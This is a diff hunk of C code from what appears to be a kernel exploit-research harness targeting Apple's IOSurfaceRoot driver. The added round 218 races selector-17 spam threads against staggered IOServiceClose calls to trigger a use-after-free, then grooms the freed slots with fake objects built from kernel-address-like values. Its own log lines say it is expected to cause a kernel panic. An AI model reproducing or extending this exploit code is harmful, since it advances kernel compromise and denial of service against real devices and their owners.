@@ -26415,25 +26415,103 @@ new_modes:
                 rlog("=== r=217 complete ===\n");
             }
 
-            /* r=216: Multi-thread register/deregister race with real surfaces
+            /* r=218: sel17 spam vs IOServiceClose + render (Phase 13 v_race8 exact)
              *
-             * Uses two connections to the same IOSurfaceRoot. Registers
-             * entries on conn1, then rapidly deregisters on conn2 while
-             * render is active. The cross-connection deregistration may
-             * have a different locking path than same-connection.
-             * Also races register (conn1) vs deregister (conn2) concurrently.
+             * Open 8 connections, register one entry on each, start 8 spam
+             * threads doing rapid sel17 on conn[0], stagger-close all conns.
+             * Race: kernel frees entries during close while spam inserts.
              *
-             * Usage: iosurface_sel17 216 [entries] [races]
+             * Usage: iosurface_sel17 218 [iters] [conns]
              */
-            /* r=216: Multi-thread register/deregister race with real surfaces
-             *
-             * Replicates Phase 13 v_race8 pattern: multiple threads doing
-             * concurrent sel17/sel18 on DIFFERENT connections with real surface IDs,
-             * while render loop is active. This is the pattern that crashed.
-             *
-             * 4 connections × 50 surfaces each = 200 concurrent race slots
-             * 8 threads: 4 registering, 4 deregistering, all concurrent
-             */
+            if (rounds == 218) {
+                rlog("\n=== r=218: sel17 spam vs close race + render ===\n");
+                rlog("  WARNING: Expected to cause kernel panic!\n");
+                int r218_outer = 20;
+                int r218_nconns = 8;
+                if (argc > 3) r218_outer = atoi(argv[3]);
+                if (argc > 4) r218_nconns = atoi(argv[4]);
+                if (r218_nconns > 8) r218_nconns = 8;
+                rlog("  Iters: %d  Conns: %d\n", r218_outer, r218_nconns);
+
+                io_service_t r218_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                if (!r218_svc) { rlog("  NO IOSurfaceRoot!\n"); goto r218_done; }
+
+                /* Open groom connection (shared with Phase 13 groom) */
+                if (!p13_groom_conn)
+                    IOServiceOpen(r218_svc, mach_task_self(), 0, &p13_groom_conn);
+
+                /* Start render loop */
+                p13_render_run = 1;
+                p13_render_frames = 0;
+                pthread_t r218_rt;
+                pthread_create(&r218_rt, NULL, p13_render_loop, NULL);
+                usleep(500000);
+                rlog("  Render active, frames=%d\n", p13_render_frames);
+
+                uint64_t inp218[3] = {1, 2, 3};
+
+                for (int iter = 0; iter < r218_outer; iter++) {
+                    io_connect_t r218_cs[8];
+                    int r218_have[8];
+                    for (int i = 0; i < r218_nconns; i++) {
+                        r218_have[i] = (IOServiceOpen(r218_svc, mach_task_self(), 0, &r218_cs[i]) == KERN_SUCCESS);
+                        if (r218_have[i]) {
+                            mach_port_t twp = MACH_PORT_NULL;
+                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &twp);
+                            mach_port_insert_right(mach_task_self(), twp, twp, MACH_MSG_TYPE_MAKE_SEND);
+                            uint64_t ref = 0x218000 + iter * 100 + i;
+                            IOConnectCallAsyncMethod(r218_cs[i], 17, twp, &ref, 1,
+                                NULL, 0, inp218, 24, NULL, NULL, NULL, NULL);
+                            mach_port_deallocate(mach_task_self(), twp);
+                        } else r218_cs[i] = IO_OBJECT_NULL;
+                    }
+
+                    /* 8 spam threads doing rapid sel17 on conn[0] */
+                    p13_spam_run = 1;
+                    p13_spam_conn = r218_have[0] ? r218_cs[0] : IO_OBJECT_NULL;
+                    p13_spam_shape = 1;
+                    p13_spam_count = 0;
+                    pthread_t r218_spams[8];
+                    for (int t = 0; t < 8; t++)
+                        pthread_create(&r218_spams[t], NULL, p13_spam_reg, NULL);
+
+                    /* Staggered close — race window */
+                    for (int r = 0; r < 3; r++)
+                        for (int i = 0; i < r218_nconns; i++) {
+                            int j = (i * 5 + r * 3) % r218_nconns;
+                            if (r218_have[j]) { IOServiceClose(r218_cs[j]); r218_have[j] = 0; }
+                            usleep(20 + (iter % 10) * 7);
+                        }
+
+                    p13_spam_run = 0;
+                    for (int t = 0; t < 8; t++) pthread_join(r218_spams[t], NULL);
+                    for (int i = 0; i < r218_nconns; i++)
+                        if (r218_have[i]) IOServiceClose(r218_cs[i]);
+
+                    /* Groom freed slots */
+                    p13_groom_fake(0xfffffff007000000ULL, 0x43414E415259ULL, 24);
+
+                    if (iter < 3 || (iter + 1) % 5 == 0)
+                        rlog("  iter[%d] spam=%llu f=%d\n", iter,
+                            (unsigned long long)p13_spam_count, p13_render_frames);
+                    p13_free_groom();
+                }
+
+                rlog("  Waiting 2s...\n");
+                usleep(2000000);
+                rlog("  SURVIVED %d iters. frames=%d\n", r218_outer, p13_render_frames);
+
+                p13_render_run = 0;
+                pthread_join(r218_rt, NULL);
+                rlog("  Total frames: %d\n", p13_render_frames);
+                if (p13_groom_conn) { IOServiceClose(p13_groom_conn); p13_groom_conn = IO_OBJECT_NULL; }
+                IOObjectRelease(r218_svc);
+                r218_done:
+                rlog("=== r=218 complete ===\n");
+            }
+
+            /* r=216: Multi-thread multi-conn race (real surfaces) */
             if (rounds == 216) {
                 rlog("\n=== r=216: Multi-thread multi-conn race (real surfaces) ===\n");
                 rlog("  WARNING: Expected to cause kernel panic!\n");
